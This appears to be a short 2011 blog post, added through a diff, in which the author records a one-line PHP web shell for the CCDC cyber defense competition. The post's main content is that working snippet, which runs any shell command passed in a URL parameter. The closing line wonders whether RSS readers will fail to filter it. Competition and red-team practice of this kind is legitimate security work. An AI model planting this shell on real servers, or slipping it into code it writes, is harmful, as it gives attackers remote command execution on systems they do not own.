@@ -1,0 +1,18 @@
+---
+author: mubix
+comments: true
+date: 2011-03-04 19:24:25+00:00
+layout: post
+title: PHP Web Shell
+categories:
+- ccdc
+- webshell
+---
+
+This is mostly for my memory for CCDC
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+I wonder what will happen if a RSS reader doesn't do proper filtering...
